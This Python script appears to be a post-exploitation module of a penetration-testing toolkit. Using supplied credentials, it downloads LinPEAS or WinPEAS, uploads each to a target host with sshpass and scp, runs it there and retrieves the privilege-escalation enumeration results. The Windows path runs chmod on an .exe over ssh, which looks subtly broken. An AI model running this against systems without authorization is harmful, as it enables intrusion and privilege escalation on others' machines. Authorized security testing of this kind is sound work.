#!/usr/bin/env python3
import os
import sys
import subprocess

# Colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
BOLD = "\033[1m"
RESET = "\033[0m"

def create_target_directory(target):
    """Create the target directory in /tmp/VirexCore/"""
    target_dir = f"/tmp/VirexCore/{target}"
    os.makedirs(target_dir, exist_ok=True)
    
    # Create post_exploitation subdirectory
    post_dir = os.path.join(target_dir, "post_exploitation")
    os.makedirs(post_dir, exist_ok=True)
    
    return target_dir, post_dir

def run_linpeas(target, post_dir, credentials):
    """Upload and run LinPEAS on Linux target"""
    username, password = credentials.split(':', 1)
    
    print(f"{YELLOW}[~] Uploading LinPEAS to {target}...{RESET}")
    
    try:
        # Download LinPEAS if not exists
        linpeas_path = "/tmp/linpeas.sh"
        if not os.path.exists(linpeas_path):
            subprocess.run(["wget", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh", "-O", linpeas_path], check=True)
        
        # Upload LinPEAS
        subprocess.run(["sshpass", "-p", password, "scp", linpeas_path, f"{username}@{target}:/tmp/"], check=True)
        
        # Run LinPEAS
        print(f"{YELLOW}[~] Running LinPEAS on {target}...{RESET}")
        subprocess.run(["sshpass", "-p", password, "ssh", f"{username}@{target}", "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh > /tmp/peas_output.txt"], check=True)
        
        # Download results
        output_file = os.path.join(post_dir, "peas_output.txt")
        subprocess.run(["sshpass", "-p", password, "scp", f"{username}@{target}:/tmp/peas_output.txt", output_file], check=True)
        
        print(f"{GREEN}[✓] LinPEAS results saved to {output_file}{RESET}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Error running LinPEAS: {e}{RESET}")
        return False
    except FileNotFoundError:
        print(f"{RED}[!] Required tools not found. Please install sshpass, wget, and scp.{RESET}")
        return False

def run_winpeas(target, post_dir, credentials):
    """Upload and run WinPEAS on Windows target"""
    username, password = credentials.split(':', 1)
    
    print(f"{YELLOW}[~] Uploading WinPEAS to {target}...{RESET}")
    
    try:
        # Download WinPEAS if not exists
        winpeas_path = "/tmp/winpeas.exe"
        if not os.path.exists(winpeas_path):
            subprocess.run(["wget", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe", "-O", winpeas_path], check=True)
        
        # Upload WinPEAS
        subprocess.run(["sshpass", "-p", password, "scp", winpeas_path, f"{username}@{target}:/tmp/"], check=True)
        
        # Run WinPEAS
        print(f"{YELLOW}[~] Running WinPEAS on {target}...{RESET}")
        subprocess.run(["sshpass", "-p", password, "ssh", f"{username}@{target}", "chmod +x /tmp/winpeas.exe && /tmp/winpeas.exe > /tmp/peas_output.txt"], check=True)
        
        # Download results
        output_file = os.path.join(post_dir, "peas_output.txt")
        subprocess.run(["sshpass", "-p", password, "scp", f"{username}@{target}:/tmp/peas_output.txt", output_file], check=True)
        
        print(f"{GREEN}[✓] WinPEAS results saved to {output_file}{RESET}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Error running WinPEAS: {e}{RESET}")
        return False
    except FileNotFoundError:
        print(f"{RED}[!] Required tools not found. Please install sshpass, wget, and scp.{RESET}")
        return False

def main():
    """Main function"""
    if len(sys.argv) < 2:
        print(f"{RED}Usage: {sys.argv[0]} <target_ip_or_domain>{RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    target_dir, post_dir = create_target_directory(target)
    
    print(f"{GREEN}[+] Target: {target}{RESET}")
    print(f"{GREEN}[+] Output directory: {post_dir}{RESET}")
    
    # Get user input
    print(f"{CYAN}→ Select OS type:{RESET}")
    print(f"{GREEN}1. Linux{RESET}")
    print(f"{GREEN}2. Windows{RESET}")
    
    os_choice = input(f"{CYAN}→ Enter choice [1-2]: {RESET}")
    os_type = {"1": "linux", "2": "windows"}.get(os_choice, "linux")
    
    credentials = input(f"{CYAN}→ Enter Credentials (format: username:password): {RESET}")
    if not credentials or ':' not in credentials:
        print(f"{RED}[!] Invalid credentials format. Use username:password{RESET}")
        sys.exit(1)
    
    # Run post-exploitation
    if os_type == "linux":
        run_linpeas(target, post_dir, credentials)
    else:
        run_winpeas(target, post_dir, credentials)

if __name__ == "__main__":
    main()